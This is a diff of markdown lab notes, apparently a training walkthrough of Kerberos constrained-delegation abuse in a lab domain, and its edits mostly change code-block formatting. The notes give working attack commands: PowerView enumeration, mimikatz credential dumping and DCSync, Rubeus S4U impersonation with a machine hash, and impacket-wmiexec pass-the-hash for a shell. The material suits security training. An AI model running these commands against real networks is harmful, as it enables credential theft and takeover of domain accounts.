@@ -17,17 +17,17 @@ IML - Kerberos: Ep.10 – Constrained Delegation
 ![image1](../resources/24572ad78ded4dd98fdf3c6ad76e3479.png)
 
 - RDP:
+
 ```bash
 xfreerdp /v:10.102.178.2 /u:s.villanelle /d:krbtown /p:Summ3r2021! +clipboard +drives /drive:root,/home/kali /dynamic-resolution
 
 ```
 - Enumerating for constrained delegation:
   - Open Powerview_dev.ps1:
-```bash
+
+```powershell
 . .\Powerview_dev.ps1
-
 Get-DomainComputer -TrustedToAuth
-
 ```
 
 ![image2](../resources/929e32b85b234e2a8dabd20fc9e07801.png)
@@ -43,9 +43,9 @@ Get-DomainComputer -TrustedToAuth
 
 - RDP to WKS-02
 - Run mimikatz
-```bash
-privilege::debug
 
+```powershell
+privilege::debug
 sekurlsa::logonpasswords
 
 ```
@@ -56,7 +56,8 @@ sekurlsa::logonpasswords
 ![image7](../resources/dc5ca5cbdc1b4844a52c7ac6aa02134a.png)
 
 - Impersonate a.belridge, using workstation-02\$ as the target host:
-```bash
+
+```powershell
 .\Rubeus.exe s4u /user:workstation-02$ /rc4:[HASH] /domain:krbtown.local /impersonateuser:a.belridge /msdsspn:"ldap/dc01.krbtown.local" /dc:dc01.krbtown.local /ptt
 
 .\Rubeus.exe s4u /user:workstation-02$ /rc4:6ee2e72810d54399a588b424ac22df1e /domain:krbtown.local /impersonateuser:a.belridge /msdsspn:"ldap/dc01.krbtown.local" /dc:dc01.krbtown.local /ptt
@@ -81,6 +82,7 @@ sekurlsa::logonpasswords
 ![image13](../resources/cbed1e41eff34035b87a29e067e09fe5.png)
 
 - Run Mimikatz on an elevated command prompt:
+
 ```bash
 lsadump::dcsync /user:krbtown\a.belridge
 
@@ -89,6 +91,7 @@ lsadump::dcsync /user:krbtown\a.belridge
 ![image14](../resources/ad8d9d01313046279b3849a1bbe84b0c.png)
 
 - Use wmiexec to get shell:
+
 ```bash
 impacket-wmiexec [DOMAIN][USERNAME]@[TARGET] -hashes '[LM-HASH]:[NT-HASH]'
 
